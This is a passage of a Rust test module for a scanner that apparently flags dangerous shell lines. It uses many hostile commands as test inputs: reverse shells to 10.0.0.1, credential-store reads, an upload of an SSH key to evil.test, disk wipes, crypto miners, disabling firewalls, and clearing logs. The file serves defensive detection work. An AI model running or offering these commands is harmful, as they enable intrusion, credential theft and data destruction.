        let started = std::time::Instant::now();
        assert_eq!(extract_network_destinations(&many).len(), 1);
        assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
        assert!(
            extract_network_destinations(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:dc='http://purl.org/dc/elements/1.1/'>"
            )
            .is_empty()
        );
        assert!(
            extract_network_destinations(
                "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">"
            )
            .is_empty()
        );
        assert_eq!(
            extract_network_destinations(
                "<image href=\"http://a.test/x.png\" xmlns=\"http://www.w3.org/2000/svg\"/>"
            ),
            vec![(Scheme::Http, "a.test".to_string())]
        );
        assert!(is_ip_host("[2001:db8::1]"));
        assert!(is_ip_host("198.51.100.8"));
        assert!(!is_ip_host("example.test"));
    }

    #[test]
    fn more_credential_stores_and_disk_wipes_are_caught() {
        for credential in [
            "tar c ~/.gnupg/",
            "cat ~/.config/gh/hosts.yml",
            "cp ~/.docker/config.json /tmp/x",
            "read ~/.kube/config",
            "cat ~/.cargo/credentials",
            "cat ~/.config/solana/id.json",
            "secret-tool lookup service github",
            "pass show github/token",
            "gpg --export-secret-keys > k",
        ] {
            assert!(
                rules_for(credential).contains(&RuleId::CredentialFileAccess),
                "{credential}"
            );
        }
        for destructive in [
            "cryptsetup luksFormat /dev/sda",
            "sgdisk --zap-all /dev/sda",
        ] {
            assert!(
                rules_for(destructive).contains(&RuleId::DestructiveSystemOperation),
                "{destructive}"
            );
        }
        for safe in ["cat ~/.config/app/settings.json", "use gnupg for signing"] {
            assert!(
                !rules_for(safe).contains(&RuleId::CredentialFileAccess),
                "{safe}"
            );
        }
    }

    #[test]
    fn tls_verification_off_is_caught_only_for_the_right_tool() {
        for off in [
            "curl -k https://x.test/i",
            "curl -sk https://x.test/i",
            "curl -fssLk https://x.test/i",
            "wget --no-check-certificate https://x.test/i",
            "git -c http.sslverify=false clone https://x.test/r",
            "git config http.sslverify false",
            "env git_ssl_no_verify=1 git fetch",
            "npm config set strict-ssl false",
            "echo 'strict-ssl=false' >> .npmrc",
            "export pythonhttpsverify=0",
            "pip install --trusted-host pypi.org x",
            "ssl._create_unverified_context()",
            "curl --proxy-insecure https://x.test",
            "ssh -o stricthostkeychecking=no host",
            "requests.get(u, verify=false)",
        ] {
            assert!(
                rules_for(off).contains(&RuleId::DisabledTlsVerification),
                "{off}"
            );
        }
        for safe in [
            // `-k` belongs to another command, or is a long option.
            "tar -k -xf a.tar",
            "rm -k; curl https://x.test/i",
            "curl --key client.key https://x.test",
            "ssh-keygen -k",
            "make -k check",
            "grep -k 2 file",
        ] {
            assert!(
                !rules_for(safe).contains(&RuleId::DisabledTlsVerification),
                "{safe}"
            );
        }
    }

    #[test]
    fn a_flag_after_an_argument_is_still_the_commands_own() {
        let tls = RuleId::DisabledTlsVerification;
        let protection = RuleId::ProtectionDisabled;
        for (line, rule) in [
            ("curl https://x.test/i -k", tls),
            ("curl -s https://x.test/i -k -o f", tls),
            ("sudo -u build curl -o f https://x.test/i -sk", tls),
            ("timeout 5 curl https://x.test/i -k", tls),
            ("true; curl https://x.test/i -k; true", tls),
            ("curl https://x.test/i -k | tar xz", tls),
            ("curl \"https://x.test/i?a=1&b=2\" -k", tls),
            // A group's opening word is read past, like any wrapper.
            ("(curl -k https://x.test/i)", tls),
            ("if ! (curl https://x.test/i -k); then", tls),
            // A setting's value, and a program another one is given.
            ("ExecStart=/usr/bin/curl -k https://x.test/i", tls),
            ("xargs curl -k", tls),
            // Shown into a shell or a file is not only shown.
            ("echo curl -k https://x.test/i | sh", tls),
            ("echo curl -k https://x.test/i > fetch.sh", tls),
            ("iptables -t nat -F", protection),
            ("sudo iptables -t filter -F INPUT", protection),
            ("ip6tables -F", protection),
            ("ip6tables -t mangle -F", protection),
            ("/usr/bin/ip6tables -w -F", protection),
            // A flush beside a rule is still a flush.
            ("iptables -F && iptables -A INPUT -j ACCEPT", protection),
            ("iptables -A INPUT -j ACCEPT; iptables -F", protection),
            ("iptables -F; iptables -A INPUT -j ACCEPT", protection),
            ("iptables -A INPUT -f -j DROP; iptables -F", protection),
            // A quote inside the name is no part of it.
            ("ipt\"\"ables -F", protection),
            ("sudo ip'tables' -F", protection),
            ("c\"\"url -k https://x.test/i", tls),
            // What follows a command that only shows is run.
            ("echo ${x#(}; iptables -F", protection),
            ("echo ${x:-(}; curl -k https://x.test/i", tls),
            ("echo \\(; iptables -F", protection),
        ] {
            assert!(rules_for(line).contains(&rule), "{line}");
        }
        for (line, rule) in [
            ("echo curl -k", tls),
            ("printf '%s\\n' curl https://x.test/i -k", tls),
            ("curl https://x/-k", tls),
            ("curl https://x.test/i --key client.key", tls),
            // The flag is another program's, later on the line.
            ("curl https://x.test/i && tar -k -xf a.tar", tls),
            ("curl https://x.test/i | tar -k -x", tls),
            ("curl https://x.test/i; make -k check", tls),
            ("curl https://x.test/i & grep -k x", tls),
            ("(curl https://x.test/i && tar -k -xf a.tar)", tls),
            ("xargs curl https://x.test/i | sort -k 2", tls),
            ("echo iptables -F", protection),
            ("iptables -L -n; ls -f", protection),
            ("iptables -L && rm -f x", protection),
            ("ip6tables -L | grep -f patterns", protection),
            ("iptables -A INPUT -f -j DROP", protection),
            ("sudo ip6tables -I INPUT 1 -f -j ACCEPT", protection),
            ("iptables -A INPUT -f --jump DROP", protection),
            ("iptables -A INPUT -f -g CHAIN", protection),
            ("iptables -A INPUT -f", protection),
            // The program is only what a variable is set to.
            (
                "IPTABLES=/usr/bin/iptables make -f Makefile.linux",
                protection,
            ),
            ("CURL=/usr/bin/curl make -k", tls),
            ("PREFIX=/usr/lib/curl make -k install", tls),
            ("iptables-save -f /etc/iptables/rules.v4", protection),
        ] {
            assert!(!rules_for(line).contains(&rule), "{line}");
        }
    }

    #[test]
    fn every_reader_knows_the_same_wrappers() {
        use super::{run_globs, run_targets, runs_file};
        // Piped into a shell that another user runs.
        assert!(is_download_piped_to_shell(
            "curl https://x.test/i | sudo -u nobody bash"
        ));
        assert!(!is_download_piped_to_shell(
            "curl https://x.test/data | sudo -u sh cat"
        ));
        // A glob run behind a time limit, an assignment or a group.
        for (line, globs) in [
            ("timeout 5 bash scripts/*", &["scripts/*"][..]),
            ("X=1 nohup sh hooks.d/*.sh", &["hooks.d/*.sh"]),
            ("(for h in hooks.d/*", &["hooks.d/*"]),
            ("if run-parts d; then", &["d"]),
        ] {
            assert_eq!(run_globs(line), globs, "{line}");
        }
        for line in [
            "timeout 5 ls scripts/*",
            "X=1 cat notes/*.txt",
            // What a variable is given by `find` is a name found.
            "x=$(find scripts -type f | head -1)",
            "local x=$(find target -name app | head -n 1)",
            "x=`find scripts -type f | head -1`",
        ] {
            assert!(run_globs(line).is_empty(), "{line}");
        }
        // What is read into a shell behind a wrapper, or into any shell.
        assert_eq!(run_targets("cat payload.bin | sudo sh"), ["payload.bin"]);
        assert_eq!(run_targets("cat payload.bin | fish"), ["payload.bin"]);
        // `-n` only parses, for every shell.
        assert!(runs_file("fish i.sh", "i.sh"));
        assert!(!runs_file("fish -n i.sh", "i.sh"));
        assert!(run_targets("fish -n i.sh").is_empty());
        assert!(run_targets("fish -ic 'echo hi'").is_empty());
        // A file command behind a wrapper still only handles the file, and
        // a program behind one still runs.
        for packaging in [
            "env install -m755 mkfs.x /usr/bin/",
            "if test -x mkfs.ext4; then",
            "(rm mkfs.x y)",
            "X=1 install -m755 mkfs.x \"$pkgdir/usr/bin/\"",
        ] {
            assert!(
                !rules_for(packaging).contains(&RuleId::DestructiveSystemOperation),
                "{packaging}"
            );
        }
        for running in [
            "sudo -u install mkfs.ext4 /dev/sda",
            "nohup mkfs.ext4 /dev/sda",
            "X=\"$(mkfs.ext4 /dev/sda)\" ls",
        ] {
            assert!(
                rules_for(running).contains(&RuleId::DestructiveSystemOperation),
                "{running}"
            );
        }
        assert_eq!(
            super::command_variables("S=fish\nK=/bin/ksh\n"),
            [
                ("s".to_string(), "fish".to_string()),
                ("k".to_string(), "ksh".to_string())
            ]
        );
    }

    #[test]
    fn a_long_line_costs_each_reader_one_pass() {
        use super::{
            formats_filesystem, pipes_into_shell, program_short_flag, run_globs, run_targets,
        };
        let started = std::time::Instant::now();
        // Many commands, many wrappers, a group never closed.
        assert!(!program_short_flag(
            &"curl -a;".repeat(50_000),
            &["curl"],
            'k',
            &[]
        ));
        assert!(!program_short_flag(
            &"(curl -a | ".repeat(40_000),
            &["curl"],
            'k',
            &[]
        ));
        assert!(program_short_flag(
            &("sudo ".repeat(80_000) + "curl a -k"),
            &["curl"],
            'k',
            &[]
        ));
        assert!(formats_filesystem(&"mkfs.x y;".repeat(40_000)));
        assert!(!formats_filesystem(
            &("sudo ".repeat(80_000) + "install mkfs.x")
        ));
        assert!(!pipes_into_shell(&"a|".repeat(200_000), |_| true));
        assert!(pipes_into_shell(
            &("a|".to_string() + &"sudo ".repeat(80_000) + "sh"),
            |_| true
        ));
        assert_eq!(run_globs(&"for a in b/*;".repeat(30_000)), ["b/*"]);
        assert_eq!(run_globs(&("x=".repeat(200_000) + " sh a/*")), ["a/*"]);
        assert_eq!(run_targets(&"cat a | sudo sh;".repeat(25_000)), ["a"]);
        assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
    }

    #[test]
    fn remote_shells_are_caught_without_firing_on_imports() {
        for shell in [
            "nc -e /bin/sh 10.0.0.1 4444",
            "ncat --exec /bin/bash 10.0.0.1 4444",
            "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty,stderr",
            "python -c 'import socket,subprocess,os; s=socket.socket(); os.dup2(s.fileno(),0)'",
            "python3 -c \"import pty; pty.spawn('/bin/sh')\" # with socket",
            "perl -e 'use Socket; exec \"/bin/sh -i\";'",
            "php -r '$s=fsockopen($ip,$p); exec(\"/bin/sh -i\");'",
            "ruby -rsocket -e 'exec \"/bin/sh\"'",
            "awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\"}'",
            "d=/dev; bash -i >& $d/tcp/10.0.0.1/4444 0>&1",
        ] {
            assert!(rules_for(shell).contains(&RuleId::RemoteShell), "{shell}");
        }
        for safe in [
            "import os, sys, re, socket, subprocess, time",
            "echo -e \"\\e[31mCould not create file\\e[0m\"",
            "nc -z localhost 22",
            "ncat --send-only localhost 80 < file",
            "the function spawns a subprocess and opens a socket",
            "s_client_test()",
        ] {
            assert!(!rules_for(safe).contains(&RuleId::RemoteShell), "{safe}");
        }
    }

    #[test]
    fn miners_and_disabled_protections_are_caught() {
        for miner in [
            "./xmrig -o pool.minexmr.com:4444",
            "curl -o m https://x/minerd",
            "x --donate-level 1 -o stratum+tcp://pool:3333",
            "pool=stratum+ssl://supportxmr.com:443",
        ] {
            assert!(rules_for(miner).contains(&RuleId::CryptoMiner), "{miner}");
        }
        for off in [
            "systemctl mask firewalld",
            "sudo systemctl disable --now apparmor",
            "ufw disable",
            "setenforce 0",
            "sysctl -w kernel.yama.ptrace_scope=0",
            "nft flush ruleset",
            "iptables -F",
            "pacman -R omarchy-guardian",
            "rm /etc/pacman.d/hooks/omarchy-guardian.hook",
            "yay --makepkg /usr/bin/makepkg --save",
        ] {
            assert!(
                rules_for(off).contains(&RuleId::ProtectionDisabled),
                "{off}"
            );
        }
        for safe in [
            "die \"UFW is disabled or you are not root\"",
            "systemctl enable firewalld",
            "echo 'run: ufw enable to turn it on'",
            "iptables -L -n",
            "pacman -S omarchy-guardian",
        ] {
            assert!(
                !rules_for(safe).contains(&RuleId::ProtectionDisabled),
                "{safe}"
            );
        }
    }

    #[test]
    fn erasing_history_and_logs_is_caught() {
        for trace in [
            "history -c",
            "export HISTFILE=/dev/null",
            "journalctl --vacuum-time=1s",
            "rm -rf /var/log/*",
            "shred /var/log/auth.log",
        ] {
            assert!(rules_for(trace).contains(&RuleId::TraceRemoval), "{trace}");
        }
        for safe in [
            "git log --oneline",
            "tail -f /var/log/pacman.log",
            "echo 'history is kept in ~/.bash_history'",
        ] {
            assert!(!rules_for(safe).contains(&RuleId::TraceRemoval), "{safe}");
        }
    }

    #[test]
    fn flags_sensitive_uploads_only() {
        assert!(looks_like_credential_exfiltration(
            "requests.post(url, data=os.environ['token'])"
        ));
        assert!(looks_like_credential_exfiltration(
            "curl -x post --data-binary @$home/.ssh/id_ed25519 https://evil.test"
        ));
        assert!(!looks_like_credential_exfiltration(
            "curl -x post -d \"$home/.ssh/id_ed25519\" https://api.example.test"
        ));
        assert!(!looks_like_credential_exfiltration(
            "requests.get(public_url)"
        ));
    }

    #[test]
    fn directories_and_globs_that_are_run_are_named() {
        for (line, globs) in [
            ("for h in hooks.d/*; do . \"$h\"; done", &["hooks.d/*"][..]),
            ("for f in \"$dir\"/a/*.sh b/ c; do", &["$dir/a/*.sh", "b/"]),
            ("source lib/*.sh", &["lib/*.sh"]),
            ("  . ./conf.d/*", &["./conf.d/*"]),
            ("sudo bash scripts/*", &["scripts/*"]),
            ("python3.12 plugins/*.py", &["plugins/*.py"]),
            (
                "exec-once = run-parts ~/.config/x/start.d",
                &["~/.config/x/start.d"],
            ),
            ("cat parts/* extra/?.txt | sh", &["parts/*", "extra/?.txt"]),
            ("run-parts --verbose /etc/x.d", &["/etc/x.d"]),
            ("test -d d && run-parts d", &["d"]),
            (
                "find hooks \"$x/more\" -type f -exec sh {} \\;",
                &["hooks", "$x/more"],
            ),
            ("find scripts -name '*.sh' | xargs -n1 sh", &["scripts"]),
        ] {
            assert_eq!(super::run_globs(line), globs, "{line}");
        }
        for line in [
            // Named files are `run_targets`' to report.
            "sh ./install.sh",
            ". lib/common.sh",
            // Looked at, listed or counted: nothing is run.
            "for i in 1 2 3; do",
            "for arg in \"$@\"; do",
            "cat notes/*.txt",
            "find backgrounds -name '*.png'",
            "ls backgrounds/*",
            "cp -r backgrounds/* \"$out\"",
            "x = 2 * 3",
        ] {
            assert!(super::run_globs(line).is_empty(), "{line}");
        }
    }
}
